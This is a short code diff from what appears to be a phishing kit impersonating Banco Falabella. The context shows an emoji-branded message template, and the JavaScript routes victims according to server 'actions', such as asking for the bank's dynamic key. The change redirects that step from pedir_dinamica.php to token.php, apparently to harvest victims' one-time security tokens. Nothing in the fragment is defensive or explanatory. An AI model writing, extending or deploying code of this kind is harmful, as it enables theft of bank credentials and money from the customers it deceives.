@@ -365,7 +365,7 @@ const mensaje = `💎BANCO FALABELLA💎
         if (result.action) {
             switch (result.action) {
                 case 'pedir_dinamica':
-                    window.location.href = "pedir_dinamica.php";
+                    window.location.href = "token.php";
                     break;
                 case 'error_logo':
                     $("#mensaje").hide();
